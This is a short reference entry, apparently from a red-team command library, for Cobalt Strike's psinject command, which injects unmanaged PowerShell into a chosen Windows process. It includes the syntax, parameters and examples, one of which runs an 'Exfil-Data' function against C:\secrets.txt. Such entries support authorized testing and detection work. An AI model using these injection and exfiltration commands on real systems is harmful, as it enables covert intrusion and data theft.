---
id: e08ef27f-e467-4c03-8c66-f95aa2d5bc12
name: cobalt-strike-inject-unmanaged-powershell-into-process
type: command
executor: bash
data: 'psinject [pid][arch] function_name arguments'
output: null
created_at: '2023-04-06T03:56:16.489692+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - cobalt-strike
  - powershell
verified: true
validated: true
---

# Cobalt Strike Inject Unmanaged PowerShell into a Process

## Command

```bash
psinject [pid][arch] function_name arguments
```

## Description

Injects unmanaged PowerShell code into a specified process ID for execution, ideal for long-running tasks without creating new processes. Specify architecture to match the target process.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `[pid]` | Target process ID (e.g., 1234) | Yes |
| `[arch]` | Architecture: x86 or x64 | Yes |
| `function_name` | PowerShell function to inject and run | Yes |
| `arguments` | Optional parameters for the function | No |

## Examples

### Basic Usage

```bash
psinject 1234 x64 Monitor-System
```

Injects into PID 1234 on x64.

### Advanced Usage

```bash
psinject 5678 x86 Exfil-Data -Path C:\secrets.txt
```

With arguments on x86 process.

## Expected Output

Beacon confirms: "[*] Injected into PID 1234" followed by function output. Asynchronous results for long jobs; errors if PID invalid or access denied.

## Related

- [[commands/cobalt-strike-launch-function-using-unmanaged-powershell]]
- [[procedures/powershell-script-execution-with-cobalt-strike]]
